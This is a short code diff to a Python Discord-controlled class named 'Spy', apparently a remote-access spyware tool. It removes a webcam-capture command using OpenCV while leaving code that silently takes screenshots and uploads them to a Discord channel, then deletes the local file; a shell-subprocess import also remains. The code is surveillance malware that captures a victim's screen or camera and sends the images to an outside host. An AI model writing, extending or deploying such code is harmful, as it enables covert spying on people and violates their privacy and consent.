@@ -3,7 +3,6 @@ from nextcord.ext import commands
 import os, shutil
 from pyautogui import screenshot
 from asyncio import create_subprocess_shell, subprocess
-from cv2 import VideoCapture, imwrite
 
 
 class Spy:
@@ -55,25 +54,6 @@ class Spy:
     async def screenshot(ctx) -> None:
         path = f"{Spy.Root}\\screenshot.png"
         screenshot().save(path)
-        await Spy.Channel.send(file=nextcord.File(path))
-        os.remove(path)
-
-    @Bot.command(help="Capture webcam image")
-    async def camera(ctx) -> None:
-        camera = VideoCapture(0)
-        if not camera.isOpened():
-            return await Spy.Debug("Couldn't open camera")
-        
-        ret, frame = camera.read()
-        if not ret:
-            return await Spy.Debug("Couldn't capture frame")
-        camera.release()
-
-        path = f"{Spy.Root}\\webcam.jpg"
-        if os.path.exists(path):
-            os.remove(path)
-
-        imwrite(path, frame)
         await Spy.Channel.send(file=nextcord.File(path))
         os.remove(path)
 
